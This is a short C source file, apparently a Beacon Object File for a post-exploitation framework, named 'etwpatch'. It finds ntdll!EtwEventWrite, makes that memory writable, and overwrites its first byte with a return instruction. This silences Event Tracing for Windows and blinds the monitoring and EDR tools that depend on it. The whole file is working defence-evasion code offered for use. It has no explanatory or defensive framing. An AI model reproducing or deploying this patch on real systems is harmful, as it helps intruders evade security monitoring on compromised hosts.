/*
 * etwpatch - patch ntdll!EtwEventWrite to return immediately.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    HMODULE ntdll;
    FARPROC fn;
    DWORD old = 0;
    (void)args; (void)alen;

    ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        BeaconPrintf(CALLBACK_ERROR, "ntdll.dll not loaded\n");
        return;
    }

    fn = KERNEL32$GetProcAddress(ntdll, "EtwEventWrite");
    if (!fn) {
        BeaconPrintf(CALLBACK_ERROR, "EtwEventWrite not found\n");
        return;
    }

    if (!KERNEL32$VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old)) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualProtect failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        return;
    }

    *(BYTE *)fn = 0xC3; /* ret */
    KERNEL32$VirtualProtect(fn, 1, old, &old);

    BeaconPrintf(CALLBACK_OUTPUT, "Patched EtwEventWrite at %p\n", fn);
}
